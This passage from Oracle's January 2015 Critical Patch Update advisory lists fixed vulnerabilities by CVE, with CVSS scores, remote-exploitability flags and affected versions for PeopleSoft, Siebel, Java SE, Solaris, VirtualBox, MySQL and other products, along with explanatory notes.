| CVE-2014-6525 | Oracle Web Applications Desktop Integrator | HTTP | Templates | No | 3.5 | Network | Medium | Single | None | Partial | None | 11.5.10.2, 12.0.6, 12.1.3, 12.2.2, 12.2.3, 12.2.4 |  |

#### Oracle Supply Chain Products Suite Executive Summary

This Critical Patch Update contains 6 new security fixes for the Oracle Supply Chain Products Suite. 3 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#SCP).

#### Oracle Supply Chain Products Suite Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2015-0435 | Oracle Transportation Management | HTTP | Security | No | 6.8 | Network | Low | Single | Complete | None | None | 6.1, 6.2, 6.3.0, 6.3.1, 6.3.2, 6.3.3, 6.3.4, 6.3.5 |  |
| CVE-2015-0368 | Oracle Transportation Management | HTTP | Security | Yes | 5.0 | Network | Low | None | None | None | Partial | 6.1, 6.2, 6.3, 6.3.1, 6.3.2, 6.3.3, 6.3.4, 6.3.5 |  |
| CVE-2014-6574 | Oracle Agile PLM for Process | HTTP | Testing Protocol Library | Yes | 4.3 | Network | Medium | None | None | Partial | None | 6.1.0.3 |  |
| CVE-2015-0431 | Oracle Transportation Management | HTTP | UI Infrastructure | Yes | 4.3 | Network | Medium | None | None | Partial | None | 6.1, 6.2, 6.3.0 6.3.1, 6.3.2, 6.3.4, 6.3.5 |  |
| CVE-2015-0422 | Oracle Transportation Management | HTTP | UI Infrastructure | No | 4.0 | Network | Low | Single | Partial | None | None | 6.1, 6.2, 6.3.0, 6.3.1, 6.3.2, 6.3.3, 6.3.4, 6.3.5 |  |
| CVE-2015-0416 | Oracle Agile PLM | HTTP | Roles & Privileges | No | 3.5 | Network | Medium | Single | None | Partial+ | None | 9.3.3 |  |

#### Oracle PeopleSoft Products Executive Summary

This Critical Patch Update contains 7 new security fixes for Oracle PeopleSoft Products. 1 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found [here](https:///security-alerts/cpujan2015verbose.html#PS) .

#### Oracle PeopleSoft Products Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2014-6586 | PeopleSoft Enterprise HRMS | HTTP | Time and Labor | No | 5.5 | Network | Low | Single | Partial | Partial | None | 9.1 |  |
| CVE-2015-0379 | PeopleSoft Enterprise PeopleTools | HTTP | PIA Core Technology | Yes | 4.3 | Network | Medium | None | None | Partial | None | 8.54 |  |
| CVE-2014-6579 | PeopleSoft Enterprise PeopleTools | HTTP | Integration Broker | No | 4.0 | Network | Low | Single | Partial | None | None | 8.52, 8.53 |  |
| CVE-2014-6597 | PeopleSoft Enterprise PeopleTools | HTTP | PIA Core Technology | No | 4.0 | Network | Low | Single | None | Partial | None | 8.52, 8.53, 8.54 |  |
| CVE-2014-6566 | PeopleSoft Enterprise PeopleTools | HTTP | Portal | No | 4.0 | Network | Low | Single | None | Partial | None | 8.53 |  |
| CVE-2015-0394 | PeopleSoft Enterprise PeopleTools | HTTP | Report Distribution | No | 4.0 | Network | Low | Single | Partial | None | None | 8.52, 8.53 |  |
| CVE-2014-4279 | PeopleSoft Enterprise PeopleTools | HTTP | PIA Core Technology | No | 3.5 | Network | Medium | Single | None | Partial | None | 8.53 |  |

#### Oracle JD Edwards Products Executive Summary

This Critical Patch Update contains 1 new security fix for Oracle JD Edwards Products. This vulnerability is remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#JDE).

#### Oracle JD Edwards Products Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2014-6565 | JD Edwards EnterpriseOne Tools | HTTP | Portal SEC | Yes | 7.5 | Network | Low | None | Partial | Partial | Partial | 9.1.5 |  |

#### Oracle Siebel CRM Executive Summary

This Critical Patch Update contains 17 new security fixes for Oracle Siebel CRM. 7 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#SECR).

#### Oracle Siebel CRM Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2015-0366 | Siebel Core - EAI | HTTP | Java Integration | Yes | 5.0 | Network | Low | None | Partial | None | None | 8.1.1, 8.2.2 |  |
| CVE-2015-0392 | Siebel Core - Server BizLogic Script | HTTP | Config - Scripting | No | 4.6 | Network | High | Single | Partial | Partial | Partial | 8.1.1, 8.2.2 |  |
| CVE-2015-0425 | Oracle Enterprise Asset Management | HTTP | Siebel Core - Unix/Windows | Yes | 4.3 | Network | Medium | None | Partial | None | None | 8.1.1, 8.2.2 |  |
| CVE-2015-0402 | Siebel Core - Server BizLogic Script | HTTP | Integration - COM | Yes | 4.3 | Network | Medium | None | None | Partial | None | 8.1.1, 8.2.2 |  |
| CVE-2015-0365 | Siebel Core - Server Infrastructure | HTTP | Security | Yes | 4.3 | Network | Medium | None | Partial | None | None | 8.1.1, 8.2.2 |  |
| CVE-2015-0369 | Siebel UI Framework | HTTP | AX/HI Web UI | Yes | 4.3 | Network | Medium | None | None | Partial | None | 8.1.1, 8.2.2 |  |
| CVE-2014-6596 | Siebel UI Framework | HTTP | Portal Framework | Yes | 4.3 | Network | Medium | None | None | Partial | None | 8.1.1, 8.2.2 |  |
| CVE-2015-0419 | Siebel UI Framework | HTTP | Portal Framework | Yes | 4.3 | Network | Medium | None | Partial | None | None | 8.1.1, 8.2.2 |  |
| CVE-2015-0387 | Siebel Core - Server OM Services | HTTP | Security - LDAP Security Adapter | No | 4.0 | Network | Low | Single | Partial | None | None | 8.1.1, 8.2.2 |  |
| CVE-2014-6528 | Siebel Core - System Management | HTTP | Server Infrastructure | No | 4.0 | Network | Low | Single | Partial | None | None | 8.1.1, 8.2.2 |  |
| CVE-2015-0363 | Siebel Core EAI | HTTP | Integration Business Services | No | 4.0 | Network | Low | Single | None | None | Partial | 8.1.1, 8.2.2 |  |
| CVE-2015-0398 | Siebel Life Sciences | HTTP | Clinical Trip Report | No | 4.0 | Network | Low | Single | Partial | None | None | 8.1.1, 8.2.2 |  |
| CVE-2015-0388 | Siebel UI Framework | HTTP | Portal Framework | No | 4.0 | Network | Low | Single | Partial | None | None | 8.1.1, 8.2.2 |  |
| CVE-2015-0417 | Siebel UI Framework | HTTP | Portal Framework | No | 4.0 | Network | Low | Single | Partial | None | None | 8.1.1, 8.2.2 |  |
| CVE-2014-6599 | Siebel Core - Common Components | HTTP | Email | No | 3.5 | Network | Medium | Single | Partial | None | None | 8.1.1, 8.2.2 |  |
| CVE-2015-0364 | Siebel Core - EAI | HTTP | Integration Business Services | No | 3.5 | Network | Medium | Single | None | None | Partial | 8.1.1, 8.2.2 |  |
| CVE-2015-0384 | Siebel Public Sector | HTTP | Public Sector Portal | No | 3.5 | Network | Medium | Single | None | Partial | None | 8.1.1, 8.2.2 |  |

#### Oracle iLearning Executive Summary

This Critical Patch Update contains 2 new security fixes for Oracle iLearning. Both of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#ILRN).

#### Oracle iLearning Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2014-6594 | Oracle iLearning | HTTP | Learner Pages | Yes | 4.3 | Network | Medium | None | Partial | None | None | 6.0, 6.1 |  |
| CVE-2015-0436 | Oracle iLearning | HTTP | Login | Yes | 4.3 | Network | Medium | None | Partial | None | None | 6.0, 6.1 |  |

### Appendix - Oracle Industry Applications

#### Oracle Communications Applications Executive Summary

This Critical Patch Update contains 2 new security fixes for Oracle Communications Applications. Both of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found [here](https:///security-alerts/cpujan2015verbose.html#CGBU) .

#### Oracle Communications Applications Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2014-6598 | Oracle Communications Diameter Signaling Router | Diameter | Signaling - DPI | Yes | 7.6 | Network | High | None | Complete | Complete | Complete | 3.x, 4.x, 5.0 |  |
| CVE-2014-1568 | Oracle Communications Messaging Server | SSL/TLS | Security | Yes | 7.5 | Network | Low | None | Partial | Partial | Partial | 7.0.5.33.0 and earlier |  |

#### Oracle Retail Applications Executive Summary

This Critical Patch Update contains 1 new security fix for Oracle Retail Applications. This vulnerability is remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found [here](https:///security-alerts/cpujan2015verbose.html#RAPP) .

#### Oracle Retail Applications Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2015-0390 | MICROS Retail | Proprietary XML | Xstore Point of Sale | Yes | 6.8 | Network | Medium | None | Partial | Partial | Partial | Xstore: 3.2.1, 3.4.2, 3.5.0, 4.0.1, 4.5.1, 4.8.0, 5.0.3, 5.5.3, 6.0.6, 6.5.2 |  |

#### Oracle Health Sciences Applications Executive Summary

This Critical Patch Update contains 1 new security fix for Oracle Health Sciences Applications. This vulnerability is remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#HCAR).

#### Oracle Health Sciences Applications Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2013-2186 | Oracle Healthcare Master Person Index | HTTP | Internal Operations | Yes | 7.5 | Network | Low | None | Partial | Partial | Partial | 1.x, 2.x | See Note 1 |

#### Notes:

1. This fix also addresses CVE-2014-0050. The CVSS score is taken from  [http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-2186](//web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-2186).

### Appendix - Oracle Java SE

#### Oracle Java SE Executive Summary

This Critical Patch Update contains 19 new security fixes for Oracle Java SE. 14 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Partial" instead of "Complete", lowering the CVSS Base Score. For example, a Base Score of 10.0 becomes 7.5.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 7 and 8 releases.

[My Oracle Support Note 360870.1](https:///https%3A//support.oracle.com/epmos/faces/DocumentDisplay?id=360870.1) explains the impact of Java security vulnerabilities on Oracle products that include an Oracle Java SE JDK or JRE.

#### Oracle Java SE Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2014-6601 | Java SE | Multiple | Hotspot | Yes | 10.0 | Network | Low | None | Complete | Complete | Complete | Java SE 6u85, Java SE 7u72, Java SE 8u25 | See Note 1 |
| CVE-2015-0412 | Java SE | Multiple | JAX-WS | Yes | 10.0 | Network | Low | None | Complete | Complete | Complete | Java SE 6u85, Java SE 7u72, Java SE 8u25 | See Note 1 |
| CVE-2014-6549 | Java SE | Multiple | Libraries | Yes | 10.0 | Network | Low | None | Complete | Complete | Complete | Java SE 8u25 | See Note 1 |
| CVE-2015-0408 | Java SE | Multiple | RMI | Yes | 10.0 | Network | Low | None | Complete | Complete | Complete | Java SE 5.0u75, Java SE 6u85, Java SE 7u72, Java SE 8u25 | See Note 1 |
| CVE-2015-0395 | Java SE | Multiple | Hotspot | Yes | 9.3 | Network | Medium | None | Complete | Complete | Complete | Java SE 5.0u75, Java SE 6u85, Java SE 7u72, Java SE 8u25 | See Note 1 |
| CVE-2015-0437 | Java SE | Multiple | Hotspot | Yes | 9.3 | Network | Medium | None | Complete | Complete | Complete | Java SE 8u25 | See Note 1 |
| CVE-2015-0403 | Java SE | None | Deployment | No | 6.9 | Local | Medium | None | Complete | Complete | Complete | Java SE 6u85, Java SE 7u72, Java SE 8u25 | See Note 1 |
| CVE-2015-0421 | Java SE | None | Install | No | 6.9 | Local | Medium | None | Complete | Complete | Complete | Java SE 8u25 | See Note 2 |
| CVE-2015-0406 | Java SE | Multiple | Deployment | Yes | 5.8 | Network | Medium | None | Partial | None | Partial | Java SE 6u85, Java SE 7u72, Java SE 8u25 | See Note 1 |
| CVE-2015-0383 | Java SE, Java SE Embedded, JRockit | None | Hotspot | No | 5.4 | Local | Medium | None | None | Partial | Complete | Java SE 5.0u75, Java SE 6u85, Java SE 7u72, Java SE 8u25, Java SE Embedded 7u71, Java SE Embedded 8u6, JRockit R27.8.4, JRockit R28.3.4 | See Note 3 |
| CVE-2015-0400 | Java SE | Multiple | Libraries | Yes | 5.0 | Network | Low | None | Partial | None | None | Java SE 6u85, Java SE 7u72, Java SE 8u25 | See Note 1 |
| CVE-2015-0407 | Java SE | Multiple | Swing | Yes | 5.0 | Network | Low | None | Partial | None | None | Java SE 5.0u75, Java SE 6u85, Java SE 7u72, Java SE 8u25 | See Note 1 |
| CVE-2015-0410 | Java SE, Java SE Embedded, JRockit | Multiple | Security | Yes | 5.0 | Network | Low | None | None | None | Partial | Java SE 5.0u75, Java SE 6u85, Java SE 7u72, Java SE 8u25, Java SE Embedded 7u71, Java SE Embedded 8u6, JRockit R27.8.4, JRockit R28.3.4 | See Note 3 |
| CVE-2014-6587 | Java SE | None | Libraries | No | 4.3 | Local | Low | Single | Partial | Partial | Partial | Java SE 6u85, Java SE 7u72, Java SE 8u25 | See Note 1 |
| CVE-2014-3566 | Java SE, Java SE Embedded, JRockit | SSL/TLS | JSSE | Yes | 4.3 | Network | Medium | None | Partial | None | None | Java SE 5.0u75, Java SE 6u85, Java SE 7u72, Java SE 8u25, Java SE Embedded 7u71, Java SE Embedded 8u6, JRockit 27.8.4, JRockit 28.3.4 | See Note 4 |
| CVE-2014-6593 | Java SE, Java SE Embedded, JRockit | SSL/TLS | JSSE | Yes | 4.0 | Network | High | None | Partial | Partial | None | Java SE 5.0u75, Java SE 6u85, Java SE 7u72, Java SE 8u25, Java SE Embedded 7u71, Java SE Embedded 8u6, JRockit 27.8.4, JRockit 28.3.4 | See Note 4 |
| CVE-2014-6585 | Java SE | Multiple | 2D | Yes | 2.6 | Network | High | None | Partial | None | None | Java SE 5.0u75, Java SE 6u85, Java SE 7u72, Java SE 8u25 | See Note 1 |
| CVE-2014-6591 | Java SE | Multiple | 2D | Yes | 2.6 | Network | High | None | Partial | None | None | Java SE 5.0u75, Java SE 6u85, Java SE 7u72, Java SE 8u25 | See Note 1 |
| CVE-2015-0413 | Java SE | None | Serviceability | No | 1.9 | Local | Medium | None | None | Partial | None | Java SE 7u72, Java SE 8u25 | See Note 1 |

#### Notes:

1. Applies to client deployment of Java only. This vulnerability can be exploited only through sandboxed Java Web Start applications and sandboxed Java applets.
2. Applies to installation process on client deployment of Java.
3. Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service.
4. Applies to client and server deployment of JSSE.

### Appendix - Oracle Sun Systems Products Suite

#### Oracle Sun Systems Products Suite Executive Summary

This Critical Patch Update contains 29 new security fixes for the Oracle Sun Systems Products Suite. 10 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#SUNS).

Solaris 8 and Solaris 9 are no longer covered by the Oracle Extended Support For Software. Hence, fixes and security alerts are no longer provided for these releases. In addition, new security issues are no longer assessed for applicability to Solaris 8 and Solaris 9. More information about support levels can be found in the Lifetime Support Policy document at

[http://www.oracle.com/us/support/library/lifetime-support-hardware-301321.pdf](//www.oracle.com/us/support/library/lifetime-support-hardware-301321.pdf)

#### Oracle Sun Systems Products Suite Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2013-4784 | Fujitsu M10-1, M10-4, M10-4S Servers | SSL/TLS | XCP Firmware | Yes | 10.0 | Network | Low | None | Complete | Complete | Complete | XCP prior to XCP 2232 |  |
| CVE-2014-4259 | Solaris Cluster | TCP/IP | System management | No | 9.0 | Network | Low | Single | Complete | Complete | Complete | 3.3, 4.1 |  |
| CVE-2015-0424 | Integrated Lights Out Manager(ILOM) | SSL/TLS | IPMI | No | 7.5 | Network | Medium | Single | Partial | Partial | Complete | ILOM prior to 3.2.4 |  |
| CVE-2014-6521 | Solaris | None | CDE - Power Management Utility | No | 7.2 | Local | Low | None | Complete | Complete | Complete | 10 |  |
| CVE-2014-6524 | Solaris | None | Kernel | No | 7.2 | Local | Low | None | Complete | Complete | Complete | 10 |  |
| CVE-2014-6510 | Solaris | None | Power Management Utility | No | 7.2 | Local | Low | None | Complete | Complete | Complete | 11 |  |
| CVE-2014-6518 | Solaris | None | Unix File System(UFS) | No | 6.6 | Local | Low | None | None | Complete | Complete | 10, 11 |  |
| CVE-2014-6480 | Solaris Cluster | None | System management | No | 6.5 | Local | Low | Multiple | Complete | Complete | Complete | 3.3, 4.1 |  |
| CVE-2011-3368 | SPARC Enterprise M3000, M4000, M5000, M8000, M9000 Servers | HTTP | XCP Firmware | Yes | 5.0 | Network | Low | None | Partial | None | None | XCP prior to XCP 1118 | See Note 1 |
| CVE-2010-5107 | SPARC Enterprise M3000, M4000, M5000, M8000, M9000 Servers | SSH | XCP Firmware | Yes | 5.0 | Network | Low | None | None | None | Partial | XCP prior to XCP 1118 |  |
| CVE-2003-0001 | Solaris | TCP/IP | AMD pcnet driver | Yes | 5.0 | Network | Low | None | Partial | None | None | 10, 11 |  |
| CVE-2004-0230 | Solaris | TCP/IP | Network | Yes | 5.0 | Network | Low | None | None | None | Partial | 10, 11 |  |
| CVE-2015-0375 | Solaris | TCP/IP | Network | Yes | 5.0 | Network | Low | None | Partial | None | None | 10, 11 |  |
| CVE-2014-6575 | Solaris | TCP/IP | Network | Yes | 5.0 | Network | Low | None | None | None | Partial | 10, 11 |  |
| CVE-2014-6570 | Solaris | None | File System | No | 4.9 | Local | Low | None | None | None | Complete | 11 |  |
| CVE-2014-6600 | Solaris | None | File System | No | 4.9 | Local | Low | None | None | None | Complete | 11 |  |
| CVE-2014-6509 | Solaris | None | Kernel | No | 4.9 | Local | Low | None | None | None | Complete | 10 |  |
| CVE-2015-0428 | Solaris | None | Resource Control | No | 4.9 | Local | Low | None | None | None | Complete | 10, 11 |  |
| CVE-2014-3566 | Fujitsu M10-1, M10-4, M10-4S Servers | SSL/TLS | XCP Firmware | Yes | 4.3 | Network | Medium | None | Partial | None | None | XCP prior to XCP 2240 |  |
| CVE-2014-3566 | SPARC Enterprise M3000, M4000, M5000, M8000, M9000 Servers | SSL/TLS | XCP Firmware | Yes | 4.3 | Network | Medium | None | Partial | None | None | XCP prior to XCP 1119 |  |
| CVE-2014-6481 | Solaris | SSL/TLS | KSSL | Yes | 4.3 | Network | Medium | None | Partial | None | None | 10, 11 |  |
| CVE-2014-6584 | Integrated Lights Out Manager(ILOM) | HTTP | Backup Restore | No | 4.0 | Network | Low | Single | Partial | None | None | ILOM prior to 3.2.4 |  |
| CVE-2014-0224 | Integrated Lights Out Manager(ILOM) | SSL/TLS | OpenSSL | No | 3.6 | Network | High | Single | Partial | Partial | None | ILOM prior to 3.2.4 |  |
| CVE-2014-0224 | SPARC Enterprise M3000, M4000, M5000, M8000, M9000 Servers | SSL/TLS | XCP Firmware | No | 3.6 | Network | High | Single | Partial | Partial | None | XCP prior to XCP 1118 |  |
| CVE-2015-0429 | Solaris | None | RPC Utility | No | 3.3 | Local | Medium | None | None | Partial | Partial | 10, 11 |  |
| CVE-2013-6450 | Integrated Lights Out Manager(ILOM) | SSL/TLS | OpenSSL | No | 2.1 | Network | High | Single | None | None | Partial | ILOM prior to 3.2.4 | See Note 2 |
| CVE-2015-0397 | Solaris | None | File System | No | 2.1 | Local | Low | None | None | None | Partial | 11 |  |
| CVE-2015-0378 | Solaris | None | Libc | No | 2.1 | Local | Low | None | None | None | Partial | 11 |  |
| CVE-2015-0430 | Solaris | None | RPC Utility | No | 1.9 | Local | Medium | None | Partial | None | None | 10, 11 |  |

#### Notes:

1. This fix also addresses CVE-2011-4317 and CVE-2012-0053.
2. This fix also addresses CVE-2013-6449.

### Appendix - Oracle Linux and Virtualization

#### Oracle Virtualization Executive Summary

This Critical Patch Update contains 11 new security fixes for Oracle Virtualization. 4 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#OVIR).

#### Oracle Virtualization Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2014-3567 | Oracle Secure Global Desktop | SSL/TLS | OpenSSL | Yes | 7.1 | Network | Medium | None | None | None | Complete | 4.63, 4.71, 5.0, 5.1 |  |
| CVE-2014-0226 | Oracle Secure Global Desktop | HTTP | Apache HTTP Server | Yes | 6.8 | Network | Medium | None | Partial | Partial | Partial | 4.63, 4.71, 5.0, 5.1 | See Note 1 |
| CVE-2014-0224 | Oracle VM VirtualBox | SSL/TLS | OpenSSL | Yes | 6.8 | Network | Medium | None | Partial | Partial | Partial | VirtualBox prior to 3.2.24, 4.0.26, 4.1.34, 4.2.26, 4.3.14 | See Note 2 |
| CVE-2015-0377 | Oracle VM VirtualBox | None | Core | No | 4.4 | Local | Medium | Single | None | None | Complete | VirtualBox prior to 3.2.26, 4.0.28, 4.1.36, 4.2.28 |  |
| CVE-2014-3566 | Oracle Secure Global Desktop | SSL/TLS | Client, Gateway JARP module, Gateway Reverse Proxy, Print Servlet (only in 5.0 & 5.1), SSL Daemon (ttassl), Web Server | Yes | 4.3 | Network | Medium | None | Partial | None | None | 4.63, 4.71, 5.0, 5.1 |  |
| CVE-2014-6595 | Oracle VM VirtualBox | None | VMSVGA device | No | 3.2 | Local | Low | Single | None | Partial+ | Partial+ | VirtualBox prior to 4.3.20 | See Note 3 |
| CVE-2014-6588 | Oracle VM VirtualBox | None | VMSVGA device | No | 3.2 | Local | Low | Single | None | Partial+ | Partial+ | VirtualBox prior to 4.3.20 | See Note 3 |
| CVE-2014-6589 | Oracle VM VirtualBox | None | VMSVGA device | No | 3.2 | Local | Low | Single | None | Partial+ | Partial+ | VirtualBox prior to 4.3.20 | See Note 3 |
| CVE-2014-6590 | Oracle VM VirtualBox | None | VMSVGA device | No | 3.2 | Local | Low | Single | None | Partial+ | Partial+ | VirtualBox prior to 4.3.20 | See Note 3 |
| CVE-2015-0427 | Oracle VM VirtualBox | None | VMSVGA device | No | 3.2 | Local | Low | Single | None | Partial+ | Partial+ | VirtualBox prior to 4.3.20 | See Note 3 |
| CVE-2015-0418 | Oracle VM VirtualBox | None | Core | No | 2.1 | Local | Low | None | None | None | Partial+ | VirtualBox prior to 3.2.26, 4.0.28, 4.1.36, 4.2.28 |  |

#### Notes:

1. This fix also addresses CVE-2014-0231, CVE-2014-0118 and CVE-2014-5704.
2. This fix also addresses CVE-2014-0221, CVE-2014-0195, CVE-2014-0198, CVE-2010-5298, CVE-2014-3470 and CVE-2014-0076.
3. VMSVGA virtual graphics device is not documented and is disabled by default.

### Appendix - Oracle MySQL

#### Oracle MySQL Executive Summary

This Critical Patch Update contains 9 new security fixes for Oracle MySQL. 3 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found [here](https:///security-alerts/cpujan2015verbose.html#MSQL) .

#### Oracle MySQL Risk Matrix

| CVE# | Component | Protocol | Sub- component | Remote Exploit without Auth.? | CVSS VERSION 2.0 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Access Vector | Access Complexity | Authen- tication | Confiden- tiality | Integrity | Avail- ability |
| CVE-2015-0411 | MySQL Server | MySQL Protocol | Server : Security : Encryption | Yes | 7.5 | Network | Low | None | Partial | Partial | Partial | 5.5.40 and earlier, 5.6.21 and earlier |  |
| CVE-2015-0382 | MySQL Server | MySQL Protocol | Server : Replication | Yes | 4.3 | Network | Medium | None | None | None | Partial+ | 5.5.40 and earlier, 5.6.21 and earlier |  |
| CVE-2015-0381 | MySQL Server | MySQL Protocol | Server : Replication | Yes | 4.3 | Network | Medium | None | None | None | Partial+ | 5.5.40 and earlier, 5.6.21 and earlier |  |
| CVE-2015-0391 | MySQL Server | MySQL Protocol | Server : DDL | No | 4.0 | Network | Low | Single | None | None | Partial+ | 5.5.38 and earlier, 5.6.19 and earlier |  |
| CVE-2015-0432 | MySQL Server | MySQL Protocol | Server : InnoDB : DDL : Foreign Key | No | 4.0 | Network | Low | Single | None | None | Partial+ | 5.5.40 and earlier |  |
| CVE-2015-0409 | MySQL Server | MySQL Protocol | Server : Optimizer | No | 4.0 | Network | Low | Single | None | None | Partial+ | 5.6.21 and earlier |  |
| CVE-2014-6568 | MySQL Server | MySQL Protocol | Server : InnoDB : DML | No | 3.5 | Network | Medium | Single | None | None | Partial+ | 5.5.40 and earlier, 5.6.21 and earlier |  |
| CVE-2015-0385 | MySQL Server | MySQL Protocol | Server : Pluggable Auth | No | 3.5 | Network | Medium | Single | None | None | Partial+ | 5.6.21 and earlier |  |
| CVE-2015-0374 | MySQL Server | MySQL Protocol | Server : Security : Privileges : Foreign Key | No | 3.5 | Network | Medium | Single | Partial | None | None | 5.5.40 and earlier, 5.6.21 and earlier |  |

Resources for

* [Careers](/careers/)
* [Developers](/developer/)
* [Investors](https://investor.oracle.com/home/default.aspx)
* [Partners](/partner/)
* [Researchers](/research/)
* [Students and Educators](https://academy.oracle.com/en/oa-web-overview.html)

Why Oracle

* [Analyst Reports](/corporate/analyst-reports/)
